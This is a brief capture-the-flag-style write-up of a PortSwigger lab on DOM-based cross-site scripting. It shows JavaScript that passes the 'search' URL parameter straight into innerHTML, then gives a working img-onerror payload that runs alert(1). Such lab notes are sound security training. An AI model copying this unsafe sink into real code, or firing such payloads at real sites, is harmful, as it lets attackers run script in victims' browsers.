# [DOM XSS: `innerHTML` Sink Using Source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

Vulnerable code from `/?search=`:

```javascript
<script>
  function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
  if(query) {
    doSearchQuery(query);
  }
</script>
```

![](_/psa-dom-xss-in-innerhtml-sink-using-source-location.search-20250611-1.png)

Payload: `/?search="%27><img%20src%20onerror=alert(1)>1%27"<>`